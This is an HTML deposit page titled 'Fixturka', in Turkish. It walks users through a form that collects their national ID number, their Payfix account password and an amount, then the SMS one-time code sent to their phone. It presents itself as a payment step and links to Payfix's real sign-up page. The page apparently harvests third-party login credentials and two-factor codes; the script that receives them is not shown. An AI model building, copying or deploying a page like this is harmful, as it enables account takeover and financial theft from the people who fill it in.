
<!DOCTYPE html>
<html>

<head>
    <title>Fixturka | Para Yatırma</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <link href="https://fonts.googleapis.com/css?family=Raleway:400,500,600,700&amp;subset=latin-ext" rel="stylesheet" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />

    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" />
    <link rel="stylesheet" type="text/css" href="css/jquery.loadingModal.css" />
    <link rel="stylesheet" href="css/dd.css">

    <link rel="stylesheet" type="text/css" href="css/app.css" />

    <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
    <script src="script.js"></script>

    
</head>

<body>
    <div class="container">
        <div class="wrapper">
            <div class="header d-none">
                <div class="navbar-header pull-left">
                    <img src="images/logo_fix.png" width="130"  />
                </div>                
            </div>


            <div class="inner d-none">
                <div class="row">
                    <div class="col-md-12 text-center">
                        Planlı bir bakım çalışması nedeniyle şuan hizmet veremiyoruz. Lütfen daha sonra tekrar deneyiniz.
                    </div>
                </div>
            </div>


                <div class="row" id="cmt-auto">
                    <div class="col-md-12">
                        <div id="result" class="alert alert-danger d-none">[error]</div>
                    </div>
                    <div class="col-md-12">
                        <div class="tab col-md-12 col-xs-12 col-sm-12 container" id="main-form">
                            <div class="row bs-wizard" style="border-bottom:0;">
                                <div class="col-4 bs-wizard-step active" id="step1Header">
                                    <div class="text-center bs-wizard-stepnum">Kullanıcı Bilgileri </div>
                                    <div class="progress">
                                        <div class="progress-bar"></div>
                                    </div>
                                    <a href="#" class="bs-wizard-dot"></a>
                                    <div class="bs-wizard-info text-center">Giriş Bilgileri ve Tutar </div>
                                </div>
                           
                                <div class="col-4 bs-wizard-step disabled" id="step2Header">
                                    <div class="text-center bs-wizard-stepnum">Giriş Onay</div>
                                    <div class="progress">
                                        <div class="progress-bar"></div>
                                    </div>
                                    <a href="#" class="bs-wizard-dot"></a>
                                    <div class="bs-wizard-info text-center">SMS Kodunuzu girin </div>
                                </div>


                                <div class="col-4 bs-wizard-step disabled" id="step3Header">
                                    <div class="text-center bs-wizard-stepnum">Sonuç</div>
                                    <div class="progress">
                                        <div class="progress-bar"></div>
                                    </div>
                                    <a href="#" class="bs-wizard-dot"></a>
                                    <div class="bs-wizard-info text-center"> İşlemi tamamlayın</div>
                                </div>
                            </div>


                            <div id="loading" class="d-none" style="text-align: center"><img src="images/loading.gif" alt=""><h3 >Lütfen bekleyin.<br />İşleminiz yapılıyor...</h3></div>
                            <form onsubmit="setPayment('payfix-3d')" id="step-1">
                                <div class="row">
                                <div class="col-md-12">
                                        <div class="form-group form-item">
                                            <label class="control-label">T.C. Kimlik No <span style="color:#f00">(*)</span></label>
                                            <input type="number" id="login" name="payfix_tc" class="form-control" placeholder="T.C. numaranızı girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
                                            <p class="help-block with-errors"></p>
                                        </div>
                                    </div>
                                    <div class="col-md-12">
                                        <div class="form-group form-item">
                                            <label class="control-label">Payfix Hesap Şifresi <span style="color:#f00">(*)</span></label>
                                            <input type="password" id="password" name="payfix_sifre" class="form-control" placeholder="Hesap şifrenizi girin" autocomplete="off" required="required" data-error="Bu alan zorunlu" />
                                            <p class="help-block with-errors"></p>
                                        </div>
                                    </div>
                                    <div class="col-md-12">
                                        <div class="form-group form-item">
                                            <label class="control-label">Tutar <span style="color: #f00">(*)</span></label>
                                            <div class="input-group">
                                                <input type="number" id="amount" name="amount" class="form-control amount" placeholder="0" autocomplete="off" required="required" data-error="Tutar en az 25, en fazla 300.000 TL olmalıdır" pattern="^[_0-9]+$" min="25" max="300000" step="1" />
                                                <div class="input-group-append">
                                                    <span class="input-group-text">TL</span>
                                                </div>
                                            </div>
                                            <p class="help-block with-errors"></p>
                                            <p class="amount-info" style="font-size: 14px;"></p>
                                        </div>
                                    </div>
                                    <div class="col-md-12">
                                        <button type="submit" class="btn btn-block btn-primary btn-hover color-9">ÖDEMEYE BAŞLA <em class="fa fa-chevron-circle-right"></em></button>
                                    </div>
                                </div>
                                
                                <div class="row d-none" id="result-error">
                                    <div class="col-md-12">
                                        <div class="alert alert-danger alert-white">
                                            <strong><i class="fa fa-times-circle"></i> Bir hata meydana geldi. <span id="error-message">[error]</span></strong>
                                        </div>
                                    </div>
                                </div>

                            </form>
                            <form action="javascript:;" onsubmit="smsOnay()" class="d-none" id="step-2">
                                <div class="row">

                                    <div class="col-md-12">
                                        <div class="form-group has-feedback">
                                            <label class="control-label">SMS Kodunuz: <span style="color: #f00">(*)</span></label>
                                            <input name="payfix_sms" id="code1" type="text" class="form-control"  placeholder="Telefonunuza gelen SMS onay kodu" required="required" data-error="Lütfen cep telefonunuza gelen SMS kodunuzu giriniz." />
                                            <p class="help-block with-errors"></p>
                                        </div>
                                    </div>
                                    <div class="col-md-12">
                                        <button type="submit" class="btn btn-block btn-success btn-hover color-9">ÖDEMEYİ TAMAMLA <em class="fa fa-chevron-circle-right"></em></button>
                                    </div>
                                </div>
                            </form>
                            <form id="step-3" class="d-none">
                                <div class="row">
                                    <div class="col-md-12">
                                        <div id="papara-payment-success">
                                            <div class="" id="balance-completed">
                                                <div class="img text-center mb-md-3 mt-md-3">
                                                    <strong><b class="get-balance"></b> İşlem başarıyla tamamlandı.</strong>
                                                </div>
                                                <div class="img text-center mb-md-3 mt-md-3 alert alert-success">
                                                    Ödemeniz hesabınıza yansıtıldı. Bizi tercih ettiğiniz için teşekkür ederiz.
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            
            </div>

             <!-- Small modal -->
             <div class="modal fade" id="register" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="ann">Yeni Üyelik</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            Bu TC kimlik numarasına ait üye hesabı bulunmamaktadır. Üye hesabı açmak için üye ol butonuna tıklayabilirsiniz.
                        </div>
                        <div class="modal-footer">
                            <a class="btn btn-success" href="https://isube.payfix.com.tr/register" target="_blank">Üye Ol</a>
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Vazgeç</button>
                        </div>
                    </div>
                </div>
            </div>


            <!-- Small modal -->
            <div class="modal fade" id="ann" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="ann">Duyuru</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            Minimum işlem limiti tüm yatırımlarda 25 TL olarak güncellenmiştir.
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Kapat ve Yatırıma Devam et</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>
        <script>
            $(document).ready(function() {
                //$('#ann').modal('show');

                $('[data-toggle="validator"]').validator();
            });
        </script>
</body>

</html>
